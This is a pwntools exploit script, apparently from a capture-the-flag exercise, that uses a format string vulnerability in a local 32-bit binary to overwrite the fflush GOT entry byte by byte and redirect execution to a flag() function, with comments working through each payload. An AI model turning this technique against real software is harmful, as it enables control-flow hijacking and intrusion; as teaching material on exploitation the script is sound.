import pwn
import struct


target = pwn.process('./32_new')
pwn.gdb.attach(target, gdbscript='b *0x080487dc') # 0x080487dc is an instruction address right after our printf

# fflush is called right after printf in the target program so we choose it to overwrite its GOT entry

# address of fflush in got: objdump -R 32_new | grep fflush
# 0x0804a028

# The address of the binary's flag() function (our target) is 0x0804870b   <------- Target address

# We will overwrite the bytes of the fflush got entry sequentially
fflush_got_0 = struct.pack("<I", 0x0804a028) #
fflush_got_1 = struct.pack("<I", 0x0804a028 + 1)
fflush_got_2 = struct.pack("<I", 0x0804a028 + 2)
fflush_got_3 = struct.pack("<I", 0x0804a028 + 3)

# Our three addresses will be stored at the 10th 11th and 12th and 13th 4-byte offsets after the location of this printf
# So this is saying write the some value to the 10th, 11th, and 12th supplied memory addresses, which happen to be the three fflush got addresses we planted
payload1 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%10$n' + b'%11$n' + b'%12$n' + b'%13$n'


# After sending our first payload, we find the value 0x56565656 in 0x0804a028
# This means that we are overwriting the contents of the address with 0x00000056 each time we do a write (and we write from right to left)
# We want our first byte to be 0x0b. 0x0b is less than 0x56, so we will have to write 1.5 bytes: 0x10b instead
# 0x10b - 0x56 = 181
# to increment by this value, we will need to cause printf to write 181 extra bytes before our %n (but after our target address)
# we can do this using %181x
payload2 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%181x' + b'%10$n' + b'%11$n' + b'%12$n' + b'%13$n'

# After sending our second payload, we find the value 0xb0b0b0b (0x0b0b0b0b) in 0x0804a028
# Now, we have written 0x10b bytes. We want the value in the 2nd byte position to be 0x87
# We will have to write 1.5 bytes:
# 0x187 - 0x10b = 124

payload3 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%181x' + b'%10$n' + b'%124x' + b'%11$n' + b'%12$n' + b'%13$n'

# After sending our third payload, we have the value 0x8787870b in 0x0804a028
# We want the third byte to be 0x04. We have written 0x187 bytes so far
# 0x204 - 0x187 = 125
# So by writing 125 more bytes, we will be writing 0x204 to the memory address

payload4 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%181x' + b'%10$n' + b'%124x' + b'%11$n' + b'%125x' + b'%12$n' + b'%13$n'

# After sending our fourth payload, we have written 0x204 bytes
# We want the fourth byte to be 08. We can add 0x4 more bytes to accomplish this
# For some reason I don't understand, using '%4x' to write those 4 bytes does not work
# Writing b'aaaa' does though. Another alternative would be to write 0x108 - 0x04 = %252x which would also work

payload5 = fflush_got_0 + fflush_got_1 + fflush_got_2 + fflush_got_3 + b'%181x' + b'%10$n' + b'%124x' + b'%11$n' + b'%125x' + b'%12$n' + b'aaaa' + b'%13$n'

# After sending our fifth payload we see that we have overwritten the target with the address of flag() yay!

target.sendline(payload5)
target.interactive()